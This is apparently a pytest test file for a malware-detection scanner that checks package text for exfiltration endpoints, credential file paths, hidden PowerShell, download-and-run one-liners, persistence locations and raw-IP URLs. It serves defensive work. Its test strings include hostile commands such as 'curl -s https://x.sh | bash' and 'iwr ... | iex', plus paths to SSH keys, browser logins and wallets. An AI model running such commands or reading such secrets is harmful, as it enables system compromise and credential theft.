import pytest

from pkg_sentry.textrules import binary_kind, check_text, public_ip


def rules(text, install_time=False):
    return sorted({f.rule for f in check_text(text, "x.py", install_time=install_time)})


@pytest.mark.parametrize(
    "text",
    [
        "https://discord.com/api/webhooks/1109465188/abc",
        "https://discordapp.com/api/webhooks/1/x",
        "https://api.telegram.org/bot123:ABC/sendMessage",
        "https://5cecdbdb0328.ngrok.app/collect",
        "eo1x2y.m.pipedream.net",
        "https://webhook.site/0b1c",
        "abc.oast.fun",
        "x.burpcollaborator.net",
        "https://pastebin.com/raw/Xy12",
    ],
)
def test_exfil_endpoints(text):
    assert rules(f"url = '{text}'") == ["exfil-endpoint"]


@pytest.mark.parametrize(
    "text",
    [
        "~/.ssh/id_rsa", "C:\\\\Users\\\\x\\\\.ssh\\\\id_ed25519", "~/.aws/credentials",
        "Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data", "Local State",
        "discord\\\\Local Storage\\\\leveldb", "wallet.dat", "/etc/shadow", "~/.npmrc",
        "nkbihfbeogaeaoehlefnkodbefgpgknn",
    ],
)
def test_secret_paths(text):
    assert rules(f"p = '{text}'") == ["secrets"]


@pytest.mark.parametrize(
    "text",
    [
        "powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBr",
        "powershell.exe -w h -c iex(iwr http://x)",
        "pwsh -enc AAAA",
        "powershell -ExecutionPolicy Bypass -File a.ps1",
    ],
)
def test_hidden_powershell(text):
    assert "hidden-powershell" in rules(text)


def test_plain_powershell_is_fine():
    assert rules("subprocess.run(['powershell', 'Get-ChildItem'])") == []


def test_hidden_powershell_is_critical_at_install():
    found = check_text("powershell -enc AAAA", "setup.py", install_time=True)
    assert found[0].critical
    assert not check_text("powershell -enc AAAA", "a.py")[0].critical


@pytest.mark.parametrize(
    "text",
    [
        "curl -s https://x.sh | bash",
        "wget -qO- http://x/y | sh",
        "curl https://x/a -o /tmp/a; chmod +x /tmp/a",
        "iwr https://x/y.ps1 | iex",
        "certutil -urlcache -split -f http://x/a.exe a.exe",
    ],
)
def test_download_and_run(text):
    assert "download-exec" in rules(text)


def test_curl_alone_is_fine():
    assert rules("curl -sSL https://example.com/data.json -o data.json") == []


@pytest.mark.parametrize(
    "text",
    [
        "AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup",
        "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        "schtasks /create /tn upd /tr x.exe",
        "~/Library/LaunchAgents/com.x.plist",
        "echo x >> ~/.bashrc",
    ],
)
def test_persistence(text):
    assert rules(text) == ["persistence"]


def test_raw_ip_urls():
    assert rules("u = 'http://45.61.137.218:8080/up'") == ["raw-ip-url"]
    assert rules("u = 'http://127.0.0.1:8000/'") == []
    assert rules("u = 'http://192.168.1.1/'") == []
    assert rules("version = '1.2.3.4'") == []


def test_line_numbers_and_snippets():
    found = check_text("a = 1\nb = 2\nurl = 'https://webhook.site/abc'\n", "m.py")
    assert found[0].line == 3
    assert "webhook.site" in found[0].snippet
    assert found[0].where == "m.py:3"


def test_public_ip():
    assert public_ip("8.8.8.8")
    assert not public_ip("10.0.0.1")
    assert not public_ip("999.1.1.1")


def test_binary_kind():
    assert binary_kind(b"MZ" + b"\0" * 100) == "a Windows program"
    assert binary_kind(b"\x7fELF\x02\x01") == "a Linux program"
    assert binary_kind(b"\xcf\xfa\xed\xfe....") == "a macOS program"
    assert binary_kind(b"MZ") is None
    assert binary_kind(b"import os") is None
